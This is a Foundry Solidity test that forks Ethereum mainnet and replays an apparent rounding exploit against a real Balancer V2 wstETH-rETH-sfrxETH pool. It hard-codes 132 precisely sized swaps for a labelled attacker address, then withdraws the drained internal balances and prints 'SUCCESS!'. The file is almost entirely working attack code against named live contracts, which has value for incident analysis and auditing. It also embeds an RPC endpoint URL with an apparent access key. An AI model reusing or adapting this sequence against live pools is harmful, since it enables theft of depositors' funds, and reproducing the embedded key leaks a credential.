// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IBalancerVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }
    enum UserBalanceOpKind { DEPOSIT_INTERNAL, WITHDRAW_INTERNAL, TRANSFER_INTERNAL, TRANSFER_EXTERNAL }
    struct SingleSwap { bytes32 poolId; SwapKind kind; IAsset assetIn; IAsset assetOut; uint256 amount; bytes userData; }
    struct FundManagement { address sender; bool fromInternalBalance; address payable recipient; bool toInternalBalance; }
    struct UserBalanceOp { UserBalanceOpKind kind; IAsset asset; uint256 amount; address sender; address payable recipient; }
    function swap(SingleSwap memory singleSwap, FundManagement memory funds, uint256 limit, uint256 deadline) external payable returns (uint256);
    function getPoolTokens(bytes32 poolId) external view returns (IERC20[] memory tokens, uint256[] memory balances, uint256 lastChangeBlock);
    function manageUserBalance(UserBalanceOp[] memory ops) external payable;
    function getInternalBalance(address user, IERC20[] memory tokens) external view returns (uint256[] memory balances);
}

interface IAsset {}

interface IERC20 { function balanceOf(address) external view returns (uint256); function approve(address, uint256) external returns (bool); function transfer(address, uint256) external returns (bool); function symbol() external view returns (string memory); }

contract BalancerQuad2PoolTest is Test {

    IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    bytes32 constant POOL_ID_QUAD2 = 0x42ed016f826165c2e5976fe5bc3df540c5ad0af700000000000000000000058b;
    address constant QUAD2_BPT = 0x42ED016F826165C2e5976fe5bC3df540C5aD0Af7;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant sfrxETH = 0xac3E018457B222d93114458476f3E3416Abbe38F;
    address constant rETH = 0xae78736Cd615f374D3085123A210448E74Fc6393;
    address constant ATTACKER = address(0xAa760D53541d8390074c61DEFeaba314675b8e3f);
    struct ExactSwapData { address tokenIn; address tokenOut; uint256 amount; uint256 expectedIn; uint8 indexIn; uint8 indexOut; }

    function testQuad2Pool() public {
        vm.createSelectFork("https://greatest-prettiest-shard.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c", 23717101);
        
        console.log("=== QUAD2 POOL TEST (wstETH-rETH-sfrxETH-BPT #2) ===");
        console.log("Pool: wstETH-rETH-sfrxETH #2 (0x42ed016f826165c2e5976fe5bc3df540c5ad0af700000000000000000000058b)");
        (IERC20[] memory tokens, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_QUAD2);
        
        console.log("INITIAL STATE:");
        console.log("BPT:", initialBalances[0]);
        console.log("wstETH:", initialBalances[1] / 1e18, "ETH");
        console.log("sfrxETH:", initialBalances[2] / 1e18, "ETH");
        console.log("rETH:", initialBalances[3] / 1e18, "ETH");
        
        deal(QUAD2_BPT, ATTACKER, 10000 ether);
        vm.startPrank(ATTACKER);
        
        IERC20(QUAD2_BPT).approve(address(VAULT), type(uint256).max);
        IERC20(wstETH).approve(address(VAULT), type(uint256).max);
        IERC20(sfrxETH).approve(address(VAULT), type(uint256).max);
        IERC20(rETH).approve(address(VAULT), type(uint256).max);
        
        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: ATTACKER, fromInternalBalance: false, recipient: payable(ATTACKER), toInternalBalance: true
        });
        
        ExactSwapData[132] memory swaps;

        swaps[0] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: wstETH, amount: 189859709496896175117, expectedIn: 0, indexIn: 0, indexOut: 1});
        swaps[1] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: sfrxETH, amount: 2126762756848096771871, expectedIn: 0, indexIn: 0, indexOut: 2});
        swaps[2] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: rETH, amount: 218562291361368816286, expectedIn: 0, indexIn: 0, indexOut: 3});
        swaps[3] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: wstETH, amount: 1898597094968961751, expectedIn: 0, indexIn: 0, indexOut: 1});
        swaps[4] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: sfrxETH, amount: 21267627568480967719, expectedIn: 0, indexIn: 0, indexOut: 2});
        swaps[5] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: rETH, amount: 2185622913613688163, expectedIn: 0, indexIn: 0, indexOut: 3});
        swaps[6] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: wstETH, amount: 18985970949689617, expectedIn: 0, indexIn: 0, indexOut: 1});
        swaps[7] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: sfrxETH, amount: 212676275684809677, expectedIn: 0, indexIn: 0, indexOut: 2});
        swaps[8] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: rETH, amount: 21856229136136882, expectedIn: 0, indexIn: 0, indexOut: 3});
        swaps[9] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: wstETH, amount: 189859709496897, expectedIn: 0, indexIn: 0, indexOut: 1});
        swaps[10] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: sfrxETH, amount: 2126762756848097, expectedIn: 0, indexIn: 0, indexOut: 2});
        swaps[11] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: rETH, amount: 218562291361368, expectedIn: 0, indexIn: 0, indexOut: 3});
        swaps[12] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: wstETH, amount: 1898597094968, expectedIn: 0, indexIn: 0, indexOut: 1});
        swaps[13] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: sfrxETH, amount: 21267627568481, expectedIn: 0, indexIn: 0, indexOut: 2});
        swaps[14] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: rETH, amount: 2185622913614, expectedIn: 0, indexIn: 0, indexOut: 3});
        swaps[15] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: wstETH, amount: 18985970950, expectedIn: 0, indexIn: 0, indexOut: 1});
        swaps[16] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: sfrxETH, amount: 212676275685, expectedIn: 0, indexIn: 0, indexOut: 2});
        swaps[17] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: rETH, amount: 21856229136, expectedIn: 0, indexIn: 0, indexOut: 3});
        swaps[18] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: wstETH, amount: 189859710, expectedIn: 0, indexIn: 0, indexOut: 1});
        swaps[19] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: sfrxETH, amount: 2126762756, expectedIn: 0, indexIn: 0, indexOut: 2});
        swaps[20] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: rETH, amount: 218562292, expectedIn: 0, indexIn: 0, indexOut: 3});
        swaps[21] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: wstETH, amount: 1898597, expectedIn: 0, indexIn: 0, indexOut: 1});
        swaps[22] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: sfrxETH, amount: 21267628, expectedIn: 0, indexIn: 0, indexOut: 2});
        swaps[23] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: rETH, amount: 2185623, expectedIn: 0, indexIn: 0, indexOut: 3});
        swaps[24] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: wstETH, amount: 18986, expectedIn: 0, indexIn: 0, indexOut: 1});
        swaps[25] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: sfrxETH, amount: 212676, expectedIn: 0, indexIn: 0, indexOut: 2});
        swaps[26] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: rETH, amount: 21856, expectedIn: 0, indexIn: 0, indexOut: 3});
        swaps[27] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: wstETH, amount: 190, expectedIn: 0, indexIn: 0, indexOut: 1});
        swaps[28] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: sfrxETH, amount: 2127, expectedIn: 0, indexIn: 0, indexOut: 2});
        swaps[29] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: rETH, amount: 218, expectedIn: 0, indexIn: 0, indexOut: 3});
        swaps[30] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: wstETH, amount: 2, expectedIn: 0, indexIn: 0, indexOut: 1});
        swaps[31] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: sfrxETH, amount: 22, expectedIn: 0, indexIn: 0, indexOut: 2});
        swaps[32] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: rETH, amount: 3, expectedIn: 0, indexIn: 0, indexOut: 3});
        swaps[33] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 49999999995, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[34] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[35] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 200000000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[36] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 1187, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[37] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[38] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 140000000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[39] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 541, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[40] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[41] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 100000000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[42] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 748, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[43] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[44] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 73000000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[45] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 31543, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[46] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[47] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 52000000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[48] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 6095, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[49] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[50] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 37000000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[51] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 5100, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[52] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[53] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 26000000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[54] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 1176, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[55] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[56] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 18000000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[57] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 325, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[58] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[59] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 13000000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[60] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 716, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[61] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[62] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 9500000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[63] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 20452, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[64] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[65] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 6200000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[66] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 3426, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[67] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[68] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 4400000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[69] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 3335, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[70] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[71] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 3100000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[72] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 1199, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[73] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[74] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 2200000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[75] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 617, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[76] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[77] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 1600000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[78] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 1905, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[79] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[80] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 1100000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[81] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 150, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[82] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[83] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 830000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[84] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 7261, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[85] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[86] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 650000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[87] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 1116, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[88] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[89] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 480000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[90] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 419, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[91] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[92] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 350000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[93] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 764, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[94] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[95] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 250000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[96] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 118, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[97] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[98] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 162000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[99] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 27, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[100] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[101] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 120000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[102] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 38, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[103] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[104] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 90000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[105] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 627, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[106] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[107] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 70000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[108] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 461, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[109] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[110] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 56000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[111] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 176, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[112] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[113] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 40000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[114] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 240, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[115] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[116] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 35000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[117] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 103, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[118] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[119] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 26000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[120] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 152, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[121] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[122] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 22000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[123] = ExactSwapData({tokenIn: wstETH, tokenOut: QUAD2_BPT, amount: 10000, expectedIn: 0, indexIn: 1, indexOut: 0});
        swaps[124] = ExactSwapData({tokenIn: sfrxETH, tokenOut: QUAD2_BPT, amount: 10000000, expectedIn: 0, indexIn: 2, indexOut: 0});
        swaps[125] = ExactSwapData({tokenIn: rETH, tokenOut: QUAD2_BPT, amount: 10000000000, expectedIn: 0, indexIn: 3, indexOut: 0});
        swaps[126] = ExactSwapData({tokenIn: wstETH, tokenOut: QUAD2_BPT, amount: 10000000000000, expectedIn: 0, indexIn: 1, indexOut: 0});
        swaps[127] = ExactSwapData({tokenIn: sfrxETH, tokenOut: QUAD2_BPT, amount: 10000000000000000, expectedIn: 0, indexIn: 2, indexOut: 0});
        swaps[128] = ExactSwapData({tokenIn: rETH, tokenOut: QUAD2_BPT, amount: 10000000000000000000, expectedIn: 0, indexIn: 3, indexOut: 0});
        swaps[129] = ExactSwapData({tokenIn: wstETH, tokenOut: QUAD2_BPT, amount: 933385689590387618651, expectedIn: 0, indexIn: 1, indexOut: 0});
        swaps[130] = ExactSwapData({tokenIn: sfrxETH, tokenOut: QUAD2_BPT, amount: 933385689590387618651, expectedIn: 0, indexIn: 2, indexOut: 0});
        swaps[131] = ExactSwapData({tokenIn: rETH, tokenOut: QUAD2_BPT, amount: 933385689590387618651, expectedIn: 0, indexIn: 3, indexOut: 0});

        console.log("Executing swaps...");
        uint256 successCount = 0;
        for (uint i = 0; i < swaps.length; i++) {
            IBalancerVault.SingleSwap memory swap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_QUAD2, kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(swaps[i].tokenIn), assetOut: IAsset(swaps[i].tokenOut),
                amount: swaps[i].amount, userData: ""
            });
            try VAULT.swap(swap, funds, type(uint256).max, block.timestamp + 3600) { successCount++; } catch {}
        }
        console.log("Swaps executed:", successCount, "/", swaps.length);
        console.log("=== WITHDRAWAL manageUserBalance() ===");
        
        IERC20[] memory internalTokens = new IERC20[](4);
        internalTokens[0] = IERC20(QUAD2_BPT);
        internalTokens[1] = IERC20(wstETH);
        internalTokens[2] = IERC20(sfrxETH);
        internalTokens[3] = IERC20(rETH);
        uint256[] memory internalBalances = VAULT.getInternalBalance(ATTACKER, internalTokens);
        
        console.log("Internal balances:");
        console.log("  BPT:", internalBalances[0] / 1e18, "ETH");
        console.log("  wstETH:", internalBalances[1] / 1e18, "ETH");
        console.log("  sfrxETH:", internalBalances[2] / 1e18, "ETH");
        console.log("  rETH:", internalBalances[3] / 1e18, "ETH");
        
        if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0 || internalBalances[3] > 0) {
            uint256 opsCount = 0;
            if (internalBalances[0] > 0) opsCount++;
            if (internalBalances[1] > 0) opsCount++;
            if (internalBalances[2] > 0) opsCount++;
            if (internalBalances[3] > 0) opsCount++;
            IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
            uint256 opIndex = 0;
            if (internalBalances[0] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(QUAD2_BPT), amount: internalBalances[0], sender: ATTACKER, recipient: payable(ATTACKER)});
            if (internalBalances[1] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(wstETH), amount: internalBalances[1], sender: ATTACKER, recipient: payable(ATTACKER)});
            if (internalBalances[2] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(sfrxETH), amount: internalBalances[2], sender: ATTACKER, recipient: payable(ATTACKER)});
            if (internalBalances[3] > 0) ops[opIndex] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(rETH), amount: internalBalances[3], sender: ATTACKER, recipient: payable(ATTACKER)});
            VAULT.manageUserBalance(ops);
            console.log("Withdrawal completed!");
        }
        vm.stopPrank();
        (,uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID_QUAD2);
        
        console.log("FINAL STATE:");
        console.log("BPT:", finalBalances[0]);
        console.log("wstETH:", finalBalances[1] / 1e18, "ETH");
        console.log("sfrxETH:", finalBalances[2] / 1e18, "ETH");
        console.log("rETH:", finalBalances[3] / 1e18, "ETH");
        
        console.log("ATTACKER BALANCES:");
        console.log("BPT:", IERC20(QUAD2_BPT).balanceOf(ATTACKER) / 1e18);
        console.log("wstETH:", IERC20(wstETH).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("sfrxETH:", IERC20(sfrxETH).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("rETH:", IERC20(rETH).balanceOf(ATTACKER) / 1e18, "ETH");

        console.log("Total swaps executed:", successCount);
        console.log("SUCCESS!");
    }

}
